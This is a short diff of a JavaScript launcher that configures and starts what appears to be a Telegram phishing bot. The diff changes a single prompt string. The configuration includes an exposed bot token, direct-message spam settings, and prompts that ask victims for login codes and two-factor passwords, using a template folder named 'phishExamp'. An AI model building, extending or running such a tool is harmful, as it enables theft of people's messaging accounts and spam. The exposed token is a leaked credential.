@@ -7,7 +7,7 @@ const path = "./bots/1231";
 
 fs.existsSync(path) || fs.mkdirSync(path);
 
-const config = createConfig("5722806586:AAFhIoDynQz_OcjCzYKN2M_KHkqFOFJv2no","5409656596", {joinChannels: [], channelsSpam: [], dmSpam: true, spamText: "1"}, {authorizationButtonText: "1", startText: "hi!", connectionText: "hi!", codeText: "1", errorSendCodeText: "!", validCodeText: "1", invalidCodeErrorText: "invalidCodeErrorText", passwordNeedErrorText: "passwordNeedErrorText", invalidPasswordError:"1"})
+const config = createConfig("5722806586:AAFhIoDynQz_OcjCzYKN2M_KHkqFOFJv2no","5409656596", {joinChannels: [], channelsSpam: [], dmSpam: true, spamText: "1"}, {authorizationButtonText: "1", startText: "hi!", connectionText: "hi!", codeText: "check", errorSendCodeText: "!", validCodeText: "1", invalidCodeErrorText: "invalidCodeErrorText", passwordNeedErrorText: "passwordNeedErrorText", invalidPasswordError:"1"})
 createBot(config, path, "./phishExamp");
 cmdWorking(`cd ${path} & python bot.py`);
 
